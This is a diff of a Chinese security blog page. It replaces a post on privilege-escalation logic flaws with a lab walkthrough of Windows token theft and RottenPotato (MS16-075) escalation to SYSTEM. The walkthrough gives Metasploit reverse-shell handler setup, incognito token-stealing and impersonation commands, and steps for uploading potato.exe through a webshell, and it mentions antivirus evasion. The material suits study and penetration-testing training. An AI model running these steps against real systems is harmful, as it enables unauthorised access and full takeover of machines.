@@ -20,29 +20,28 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":true,"version":"8.14.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"show_result":"default","style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta property="og:type" content="article">
-<meta property="og:title" content="水平垂直越权">
-<meta property="og:url" content="http://example.com/2023/02/07/%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/index.html">
+    <meta name="description" content="令牌窃取什么是令牌？ 令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非系统重新启动。 令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网">
+<meta property="og:type" content="article">
+<meta property="og:title" content="烂土豆(RottenPotato)web提权system">
+<meta property="og:url" content="http://example.com/2023/03/10/%E7%83%82%E5%9C%9F%E8%B1%86(RottenPotato)web%E6%8F%90%E6%9D%83system/index.html">
 <meta property="og:site_name" content="元酒InfoSec">
+<meta property="og:description" content="令牌窃取什么是令牌？ 令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非系统重新启动。 令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2023/02/07/%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/image-20230207151741353.png">
-<meta property="article:published_time" content="2023-02-07T07:17:25.000Z">
-<meta property="article:modified_time" content="2023-02-27T06:39:43.837Z">
+<meta property="article:published_time" content="2023-03-10T06:10:02.000Z">
+<meta property="article:modified_time" content="2023-03-13T09:43:36.694Z">
 <meta property="article:author" content="yuanjiu">
-<meta property="article:tag" content="web">
-<meta property="article:tag" content="逻辑越权">
+<meta property="article:tag" content="提权">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2023/02/07/%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/image-20230207151741353.png">
 
 
-<link rel="canonical" href="http://example.com/2023/02/07/%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/">
+<link rel="canonical" href="http://example.com/2023/03/10/%E7%83%82%E5%9C%9F%E8%B1%86(RottenPotato)web%E6%8F%90%E6%9D%83system/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/02/07/%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/","path":"2023/02/07/水平垂直越权/","title":"水平垂直越权"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/03/10/%E7%83%82%E5%9C%9F%E8%B1%86(RottenPotato)web%E6%8F%90%E6%9D%83system/","path":"2023/03/10/烂土豆(RottenPotato)web提权system/","title":"烂土豆(RottenPotato)web提权system"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>水平垂直越权 | 元酒InfoSec</title>
+<title>烂土豆(RottenPotato)web提权system | 元酒InfoSec</title>
   
 
 
@@ -143,7 +142,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.</span> <span class="nav-text">前提条件</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="nav-number">1.0.1.</span> <span class="nav-text">如何获取数据包</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">2.</span> <span class="nav-text">原理</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%89%8D%E7%AB%AF%E6%BC%8F%E6%B4%9E%E9%80%A0%E6%88%90%EF%BC%9A%E7%95%8C%E9%9D%A2"><span class="nav-number">2.0.1.</span> <span class="nav-text">前端漏洞造成：界面</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E%E9%80%A0%E6%88%90%EF%BC%9A%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">2.0.2.</span> <span class="nav-text">后端漏洞造成：数据库</span></a></li></ol></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96"><span class="nav-number">1.</span> <span class="nav-text">令牌窃取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%83%82%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83%EF%BC%88MS16-075%EF%BC%89"><span class="nav-number">2.</span> <span class="nav-text">烂土豆提权（MS16-075）</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -201,7 +200,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/07/%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/10/%E7%83%82%E5%9C%9F%E8%B1%86(RottenPotato)web%E6%8F%90%E6%9D%83system/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
@@ -214,12 +213,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="水平垂直越权 | 元酒InfoSec">
+      <meta itemprop="name" content="烂土豆(RottenPotato)web提权system | 元酒InfoSec">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          水平垂直越权
+          烂土豆(RottenPotato)web提权system
         </h1>
 
         <div class="post-meta-container">
@@ -230,14 +229,14 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2023-02-07 15:17:25" itemprop="dateCreated datePublished" datetime="2023-02-07T15:17:25+08:00">2023-02-07</time>
+      <time title="创建时间：2023-03-10 14:10:02" itemprop="dateCreated datePublished" datetime="2023-03-10T14:10:02+08:00">2023-03-10</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-02-27 14:39:43" itemprop="dateModified" datetime="2023-02-27T14:39:43+08:00">2023-02-27</time>
+      <time title="修改时间：2023-03-13 17:43:36" itemprop="dateModified" datetime="2023-03-13T17:43:36+08:00">2023-03-13</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -245,7 +244,7 @@
       </span>
       <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
+          <a href="/categories/%E5%AE%9E%E9%AA%8C/" itemprop="url" rel="index"><span itemprop="name">实验</span></a>
         </span>
     </span>
 
@@ -259,43 +258,40 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <p><img src="/2023/02/07/%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/image-20230207151741353.png" alt="image-20230207151741353"></p>
+        <h2 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h2><p><strong>什么是令牌？</strong></p>
+<p>令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非系统重新启动。</p>
+<p>令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非系统重新启动。</p>
 <span id="more"></span>
 
-<p><strong>水平越权</strong>：获取同级用户账户信息</p>
-<p><strong>垂直越权</strong>：添加高权限用户</p>
-<h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>获取添加用户的数据包</p>
-<h5 id="如何获取数据包"><a href="#如何获取数据包" class="headerlink" title="如何获取数据包"></a>如何获取数据包</h5><ol>
-<li>普通用户前端有操作页面可以抓取数据包</li>
-<li>通过网站源码本地搭建去模拟抓取</li>
-<li>盲猜</li>
-</ol>
-<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h5 id="前端漏洞造成：界面"><a href="#前端漏洞造成：界面" class="headerlink" title="前端漏洞造成：界面"></a>前端漏洞造成：界面</h5><p>判断用户等级后，代码界面部分进行可选显示 </p>
-<h5 id="后端漏洞造成：数据库"><a href="#后端漏洞造成：数据库" class="headerlink" title="后端漏洞造成：数据库"></a>后端漏洞造成：数据库</h5><p>user 表(管理员和普通用户同表）如：</p>
-<table>
-<thead>
-<tr>
-<th>id</th>
-<th>username</th>
-<th>password</th>
-<th>usertype</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1</td>
-<td>admin</td>
-<td>123456</td>
-<td>1</td>
-</tr>
-<tr>
-<td>2</td>
-<td>xiaodi</td>
-<td>11111</td>
-<td>2</td>
-</tr>
-</tbody></table>
-<p><strong>代码的级别判断</strong>：usertype值</p>
-<p>若访问网站数据包中有传输用户的编号、用户组编号或类型编号的时候，可尝试对此值进行修改，这就是测试越权漏洞基本方法。</p>
+<p><strong>令牌种类</strong></p>
+<p>访问令牌(Access Token)：表示访问控制操作主体的系统对象 。<br>会话令牌(Session Token)：是交互会话中唯一的身份标识符。<br>密保令牌(Security Token)：又叫做认证令牌或硬件令牌，是一种计算机身 份校验的物理设备，例如 U 盾。<br>      Windows 的 AccessToken 有两种类型：</p>
+<p>Delegation Token：授权令牌，它支持交互式会话登录 (例如本地用户直接 登录、远程桌面登录访问)<br>Impresonation Token：模拟令牌，它是非交互的会话 (例如使用 net use 访问共享文件夹)。<br>      （注：<code>两种 token 只在系统重启后清除 具有 Delegation token 的用户在注销后，该 Token 将变成 Impersonation，依旧有效</code>。）<br><strong>窃取过程</strong></p>
+<p>1.生成msf的后门shell</p>
+<p>2上传并运行后门（大概率要做免杀）</p>
+<p>3.msf开启监听（windows）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole  </span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost x.x.x.x  // 你设置监听的ip</span><br><span class="line">set lport xxx  // 你设置监听的端口</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>4.成功获取会话</p>
+<p>5.incognito模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">伪造令牌：</span><br><span class="line">use incognito  #加载incognito模块</span><br><span class="line">list_tokens -u  #列出AccessToken</span><br><span class="line">getuid  #查看当前token</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;  #模拟system 用户，getsystem 命令，即实现了该命令。如果要模拟其他用户，将 token 名改为其他用户即可</span><br><span class="line"></span><br><span class="line">进程窃取令牌</span><br><span class="line">steal_token 1252  #从进程窃取token</span><br><span class="line">getsystem  #提升至system 权限</span><br><span class="line">rev2self  #返回到之前的AccessToken 权限</span><br></pre></td></tr></table></figure>
+
+<h2 id="烂土豆提权（MS16-075）"><a href="#烂土豆提权（MS16-075）" class="headerlink" title="烂土豆提权（MS16-075）"></a><strong>烂土豆提权（MS16-075）</strong></h2><p>ms16-075漏洞介绍：</p>
+<p>​		Windows SMB 服务器特权提升漏洞（CVE漏洞编号：CVE-2016-3225）当攻击者转发适用于在同一计算机上运行的其他服务的身份验证请求时，Microsoft 服务器消息块 (SMB) 中存在特权提升漏洞，成功利用此漏洞的攻击者可以使用提升的特权执行任意代码。若要利用此漏洞，攻击者首先必须登录系统。然后，攻击者可以运行一个为利用此漏洞而经特殊设计的应用程序，从而控制受影响的系统。此更新通过更正Windows服务器消息块 (SMB) 服务器处理凭据转发请求的方式来修复此漏洞。微软将其定义为KB3164038</p>
+<p>RottenPotato（烂土豆）提权的原理可以简述如下：</p>
+<p>1.欺骗“NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。</p>
+<p>2.对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的Windows API调用实现的。</p>
+<p>3.模仿这个令牌。只有具有“模仿安全令牌权限的账户才能去模仿别人的令牌。一般大多数的服务型账户（llS、MSSQL等）有这个权限，而大多数用户级的账户没有这个权限。</p>
+<p>​		一般从web拿到的webshell都是IS服务器权限，是具有这个模仿权限的。测试过程中，使用已经建好的账户（就是上面说的用户级账户）去反弹meterpreter然后再去执行EXP的时候会失败，但使用莱刀（llS服务器权限）反弹meterpreter就会成功。</p>
+<p>烂土豆比热土豆的优点是：<br>1.100%可靠<br>2.全版本通杀（<code>现在要做免杀</code>）<br>3.立即生效，不用像hot potato那样有时候需要等Windows更新才能使用。<br>        总之，我对这个的理解是通过中间人攻击，将COM（NT\SYSTEM权限）在第二步挑战应答过程中认证的区块改成自己的区块获取SYSTEM令牌，然后利用msf的模仿令牌功能模仿SYSTEM令牌。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">1.拿到webshell，上传烂土豆</span><br><span class="line"></span><br><span class="line">upload /root/potato.exe C:\Users\Public</span><br><span class="line"></span><br><span class="line">2.利用窃取模块列出AccessToken</span><br><span class="line"></span><br><span class="line">cd C:\\Users\\Public </span><br><span class="line"></span><br><span class="line">use incognito </span><br><span class="line"></span><br><span class="line">list_tokens -u</span><br><span class="line"></span><br><span class="line">3.执行烂土豆</span><br><span class="line"></span><br><span class="line">execute -cH -f ./potato.exe </span><br><span class="line"></span><br><span class="line">list_tokens -u </span><br><span class="line"></span><br><span class="line">impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</span><br><span class="line"></span><br><span class="line">4.窃取成功</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/123429203">https://blog.csdn.net/qq_44159028/article/details/123429203</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44029310/article/details/126110570">https://blog.csdn.net/qq_44029310/article/details/126110570</a></p>
 
     </div>
 
@@ -305,21 +301,20 @@
 
     <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i> web</a>
-              <a href="/tags/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> 逻辑越权</a>
+              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> 提权</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2023/02/07/%E5%85%B3%E4%BA%8Exss%E7%9A%84%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/" rel="prev" title="关于xss的相关总结">
-                  <i class="fa fa-chevron-left"></i> 关于xss的相关总结
+                <a href="/2023/03/06/ssrf%E6%80%BB%E7%BB%93/" rel="prev" title="ssrf总结">
+                  <i class="fa fa-chevron-left"></i> ssrf总结
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2023/02/10/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" rel="next" title="业务逻辑漏洞">
-                  业务逻辑漏洞 <i class="fa fa-chevron-right"></i>
+                <a href="/2023/03/15/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E6%80%BB%E7%BB%93/" rel="next" title="常见端口总结">
+                  常见端口总结 <i class="fa fa-chevron-right"></i>
                 </a>
             </div>
           </div>
